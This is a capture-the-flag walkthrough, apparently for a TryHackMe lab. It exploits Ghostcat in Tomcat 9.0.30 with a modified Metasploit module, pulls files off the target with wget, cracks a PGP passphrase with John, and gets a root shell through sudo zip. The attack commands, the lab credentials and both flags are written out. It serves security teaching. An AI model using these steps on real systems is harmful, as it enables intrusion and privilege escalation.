### Find the services exposed by the machine
```BASH
nmap -sV -p- 10.10.119.52
```
![image](https://github.com/user-attachments/assets/843c0030-20f7-4aa6-9408-5b3c25261a22)

TCP port 8009 is open and running the Apache JServ Protocol (AJP) 1.3, while port 8080 is serving an Apache Tomcat 9.0.30 instance. This version of Apache Tomcat (9.0.30), when combined with an exposed AJP port is vulnerable to the [Ghostcat vulnerability - CVE-2020-193](https://www.exploit-db.com/exploits/49039)

<span style="line-height:0.5;">&nbsp;</span>

### Get credentials
The exploit runs a Metasploit module or code that depends on the Metasploit Framework, so it must be executed within Metasploit. Before moving the file to the correct directory, I had to make a few modifications to get it working. 

Copy code to a new file and create the directory for the custom module:
```BASH
mkdir -p ~/.msf4/modules/exploits/multi/http
```
Move  `exploit.rb` into the directory:
```BASH
mv exploit.rb ~/.msf4/modules/exploits/multi/http/ghostcat.rb
```
Run msfconsole:
```BASH
msfconsole
```
Reload all modules:
```BASH
reload_all
```
Use the custom module:
```BASH
use exploit/multi/http/ghostcat
```
Set the parameters and run the exploit:
```BASH
set RHOSTS 10.10.149.201
set RPORT 8009
set FILENAME /WEB-INF/web.xml
run
```
![image](https://github.com/user-attachments/assets/ed1c8cf8-ae01-4e7a-af22-9cce1496c9cf)  

This indicates the exploit successfully read the file from the remote Tomcat server via the AJP port. However, the script doesn't print the actual response body. Go back to the script's directory and make the following change:  

Replace:
```RUBY
print "#{buf[idx..(idx+len)]}"
```
With:
```RUBY
content = buf[idx...(idx+len)]
print_status("File contents:\n")
print_line(content)
```

<span style="line-height:0.5;">&nbsp;</span>

### Fix Internal Server Error
![image](https://github.com/user-attachments/assets/8bfb432d-af72-4b74-8bb0-4b29f97ef7f2)  

If the server responds with:
```BASH
500 Internal Server Error
Message: The requested resource [index] is not available
```

It's due to this line in the script:
```RUBY
{"req_attribute" => ["javax.servlet.include.request_uri", "index"]},
```

Go back to the directory where custom module is located and make more changes:
Replace:
```RUBY
attributes = [
    {"req_attribute" => ["javax.servlet.include.request_uri", "index"]},
    {"req_attribute" => ["javax.servlet.include.path_info" , target_file]},
    {"req_attribute" => ["javax.servlet.include.servlet_path" , "/"]}
]
```
With:
```RUBY
attributes = [
    {"req_attribute" => ["javax.servlet.include.request_uri", "/"]},
    {"req_attribute" => ["javax.servlet.include.path_info" , target_file]},
    {"req_attribute" => ["javax.servlet.include.servlet_path" , "/"]}
]
```

Go back to msfconsole, set parameters again, and rerun:
```BASH
set RHOSTS 10.10.149.201
set RPORT 8009
set FILENAME /WEB-INF/web.xml
run
```
From the response you can see that credentials are `skyfuck:8730281lkjlkjdqlksalks`  

![image](https://github.com/user-attachments/assets/9d9d8391-1e8e-4079-96d3-beb9665c44c7)
![image](https://github.com/user-attachments/assets/1ee42b3a-bb7d-4f8a-9639-c016b6204ade)

<span style="line-height:0.5;">&nbsp;</span>

### Log in to the skyfuck account
Use SSH:
```BASH
ssh skyfuck@10.10.149.201
```
![image](https://github.com/user-attachments/assets/b3d3f0ca-4b05-4925-bd46-1ca9a8458e55)

Inside the account, there are two suspicious files: `credential.pgp` and `tryhackme.asc`. These are likely PGP-encrypted and may contain the flag or credentials.   

![image](https://github.com/user-attachments/assets/d6526c3c-a1d9-4e02-bd78-0801d744d2e3)

<span style="line-height:0.5;">&nbsp;</span>

### Download encrypted files to your attack machine
Start a Python HTTP server on the victim machine:
```BASH
python3 -m http.server 8000
```

On your attack box:
```BASH
wget http://10.10.149.201:8000/credential.pgp
wget http://10.10.149.201:8000/tryhackme.asc
```
![image](https://github.com/user-attachments/assets/e8924bc1-ac8c-4e27-921a-35e5a7a76071)

<span style="line-height:0.5;">&nbsp;</span>

### Crack the PGP key passphrase with John the Ripper
Run gpg2john on the exported key:
```BASH
gpg2john secret.asc > pgp.hash
```
Run John on the hash:
```BASH
john --wordlist=/usr/share/wordlists/rockyou.txt pgp.hash
```
![image](https://github.com/user-attachments/assets/a3fe8843-6791-4c58-a713-98f8c63ace80)

The passphrase is `alexandru`. That is the passphrase protecting the tryhackme.asc, which is used to decrypt the file credential.pgp. Import the key and decrypt the file:
```BASH
gpg --import tryhackme.asc
gpg --decrypt credential.pgp
```
![image](https://github.com/user-attachments/assets/74e4d93c-a1ab-420b-91b0-a1c9db65f53a)
This reveals new credentials: `merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j`

<span style="line-height:0.5;">&nbsp;</span>

### Log in to the merlin account
Switch user:
```BASH
su merlin
```
Go to home directory.
```BASH
cd /home/merlin
```
![image](https://github.com/user-attachments/assets/87e0dbca-d8a4-4fd3-968a-2d129ad4d7c8)

user.txt flag:
<pre>THM{GhostCat_1s_so_cr4sy}</pre>

<span style="line-height:0.5;">&nbsp;</span>

### Escalate privileges and obtain root.txt
Run this command to check what merlin is allowed to run as root or with elevated privileges, without a password or under specific conditions. 
```BASH
sudo -l
```

![image](https://github.com/user-attachments/assets/fd072d8d-0b6a-416f-8017-843643002cfe)  

Merlin can run /usr/bin/zip as root without password. To escalate privileges using zip go to [GTFOBins](https://gtfobins.github.io/) and search zip. Go to 'Sudo' section and if you can run zip as root via sudo, spawn a root shell by running:
```BASH
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
```

Read root flag.
```BASH
cat /root/root.txt
```

![image](https://github.com/user-attachments/assets/c9d1a816-d330-41a0-bab0-196ec2525ba3)

root.txt flag:
<pre>THM{Z1P_1S_FAKE}</pre>
